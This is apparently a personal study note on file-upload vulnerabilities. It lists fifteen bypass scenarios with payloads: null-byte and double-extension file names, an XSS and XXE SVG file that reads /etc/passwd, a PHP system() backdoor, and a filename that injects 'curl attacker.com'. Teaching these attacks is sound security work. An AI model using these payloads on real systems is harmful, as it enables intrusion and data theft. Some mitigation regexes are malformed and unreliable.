**Blacklisting Dangerous files?**

The developer validates that the uploaded file doesn’t have or contain .php or php5 etc via black-listing

technique.

**Bypass**:

Above Regex is vulnerable as it doesn’t check the case insensitivity of file extension.

**Mitigation:**

^.*\.(php|php1|php2|php3|php4|php5|php6|php7|phtml|exe)$/i

**The main headers are:**

- File Name
- File Type
- Magic Number
- File Content
- File Size

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2c11caa8-85ea-442d-9e61-78969ce6b2d9/Untitled.png)

# ****Scenario 1 (BlackList only php )****

**Blacklisting Dangerous files?**

The developer validates that the uploaded file doesn’t have or contain `.php` or `php5` etc via black-listing technique.

**Bypass**:

Above Regex is vulnerable as it doesn’t check the **case insensitivity** of file extension. [ `PHP` ]

**Mitigation:**

`^.*\\.(php|php1|php2|php3|php4|php5|php6|php7|phtml|exe)$/i`

# **Scenario 2 (Apache-Linux)**

**Properly Blacklisting .php files**

The developer properly validate that the uploaded file doesn’t have or contain `.php`, `PHP`, or `php5` etc via black-listing technique.

**How to bypass:**

We can bypass this validation using the `.pht` files. The `PHT` file stores `HTML` page that includes a `PHP` script.

# **Scenario 2 (IIS-Windows)**

On windows servers, if the same validation is done for asp pages, we can bypass it using `.cer` & `.asa` extensions. `IIS <= 7.5` have Both `*.asa` and `*.cer` mapped to `asp.dll`, thus executing `ASP code`.

# **Scenario 3 (BlackList all executable extensions)**

**Bypassing all executabel extensions?**

In this scenario the developer is **black-listing all dangerous extensions** that would allow code execution.

But how about using .**`eml`** to trigger a Stored XSS?

**Source**: [[0day] Text/Plain Considered Harmful – Jan's security blog (jankopecky.net)](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)

# **Scenario 4 (Validating Filename only (Whitelist))**

In this scenario, the developer is validating the filename ONLY by **Whitelisting `**.jpg` via server-side code, using below Regex

`^.*\\.(jpg|gif|png)`

The regex is **NOT properly implemented**. It validates that the filename contains `.jpg` but doesn’t validate that the filename ends with `.jpg`

**Bypass → `test.jpg.php`**

**Mitigation → `^.*\\(jpg|gif|png)$\\i`**

# **Scenario 5 (Null Byte Injection)**

The **null** character is a control character with the value **zero**. PHP treats the **Null** Bytes `%00` as a terminator (same as C does).

**Bypass → R**enaming your file to be **`shell.php%001.jpg`** or **`shell.php\\x00.jpg`** shall satisfy the file upload page because the

file ends with .jpg, but the file will be treated as .php due to termination of whatever after the Null Byte.

**Note:** renaming the file to `shell.phpD.jpg`, upload it and then replace the hex represntaion of D with 00 will

also **work**.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8e61c8bf-1806-4ae8-b90a-70e2be2a14cf/Untitled.png)

# **Scenario 6 ( allows upload of .svg images )**

SVG images are just **XML data**. Using **XML** you can achieve lots of vulnerabilities, for instance `XXE`, or `Stored XSS` as below.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/1a23b859-265b-40bf-a569-fb06d945ca14/Untitled.png)

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "<http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd>">
<svg version="1.1" baseProfile="full" >
   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
   <script type="text/javascript">
      alert("xss");
   </script>
</svg>
```

[Exploiting XXE via File Upload. Before moving further we must get… | by Gupta Bless | Medium](https://gupta-bless.medium.com/exploiting-xxe-via-file-upload-f6e62153e85d)

```xml
<?xml version=”1.0" standalone=”yes”?>

<!DOCTYPE test [ <!ENTITY xxe SYSTEM “file:///etc/hostname” > ]>

These 2 lines are base of xml. The only thing I changed here is “file:///etc/hostname”. I actually mentioned a system command which upon processing fetches the file from the server.

<svg width=”128px” height=”128px” xmlns=”<http://www.w3.org/2000/svg>" xmlns:xlink=”<http://www.w3.org/1999/xlink>" version=”1.1">

<text font-size=”16" x=”0" y=”16">&xxe;</text>

</svg>
------------------------------------------------------------------------------------------------------
<xml> <?xml version="1.0" encoding="ISO-8859-1"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]> <username>&xxe;</username> </xml>
```

[Zivver | Report #897244 - XXE Injection through SVG image upload leads to SSRF | HackerOne](https://hackerone.com/reports/897244)

---

# **Scenario 7 ( Allowing video uploads )**

Due to a SSRF vulnerability in `ffmpeg` library, it is possible to create a video file that when uploaded to any application that supports video files (i.e Youtube, vk, Flicker etc)

you will be able to read files from that server when you try to watch the video!

**Command:** `ffmpeg -i video.avi{m3u} video.mp4` - [Tool](https://github.com/neex/ffmpeg-avi-m3u-xbin/)

---

# **Scenario 8 ( Directory Traversal )**

You can upload your file with the name of “`../../../logo.jpg`” for example to replace the main website logo.

This issue happens due to lack of validating the filename.

Demo: [Twitter | Report #191884 - Remote Unrestricted file Creation/Deletion and Possible RCE. | HackerOne](https://hackerone.com/reports/191884)

---

# **Scenario 9 ( Validating the file content and missing the file-name )**

Developer is passing the uploaded file to `PHP-GD` library to make sure that the uploaded file is an image and doesn’t contain meta-data, however, not validating the uploaded file name.

**How to bypass:**

- We get a normal image, convert it using the `php-gd` library
- Now we have 2 files, we convert it to hex and start searching for identical bytes
- When finding the identical bytes, we replace those bytes with our backdoor code (i.e. `<?system($GET[‘x’]);?>`)

[https://secgeek.net/bookfresh-vulnerability/](https://secgeek.net/bookfresh-vulnerability/)

---

# **Scenario 10 ( Image Tragic Attack )**

SVG images are just XML data. Using XML you can achieve lots of vulnerabilities, for instance ImageMagic which is an image processing library is vulnerable to SSRF and RCE vulnerabilities.

Source (Facebook RCE): [Facebook's ImageTragick Remote Code Execution (4lemon.ru)](http://4lemon.ru/2017-01-17_facebook_imagetragick_remote_code_execution.html)

---

# **Scenario 11 ( Exploiting old IIS servers )**

IIS in its earlier **versions < 7.0** had an issue handling the uploaded files. An attacker can bypass the file upload pages using

**********************Bypass →********************** `shell.aspx;1.jpg`

---

# **Scenario 12 ( DOS Attack )**

Web applications that doesn’t validate the file-size of the uploaded files are vulnerable to DOS attack as an attacker can upload many large files which will exhaust the server hosting space.

**Bypass → upload file > 10 mg unlimited times**

---

# **Scenario 13 ( Magic Numbers )**

Developers validates the file-contents starts with Magic Numbers and the file-content is set to image/gif.

**Exploit:**

Uploading `shell.php` but setting the content type to `image/gif` and starting the file contants with **`GIF89a**;` will do the job!

**RCE via zip files**

Developers accepts **zip** file, but handle **filenames** via **command line**.

**Exploit:**

**`Filename;curl attacker.com;pwd.jpg`**

---

# **Scenario 14 ( OOB SQL Injection via filename )**

If the developers are trusting the filenames and pass it directly to the Database, this will allow attackers to execute Out of Band SQL Injection.

A good scenario would be companies asking you to submit your CV without validating the CV name.

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/36e19cea-dd11-4693-9ef3-c8341515f25f/Untitled.png)

---

# **Scenario 15 ( Cross Domain Content Hijacking )**

When developers are validating the uploaded filename, content-type but missing to validate the uploaded file content. It is

possible to upload a Flash file with .jpg extension, then call that flash file with <object tags in your website and Bingo, you

are able to do Cross Origin Requests to steal CSRF tokens.

**How browsers see it?**

1. Plugins like Flash doesn't care about the extension or content-type
    
2. If the file is embeded using <object> tag, it will be executed as a Flash file as long as the file content looks like Flash.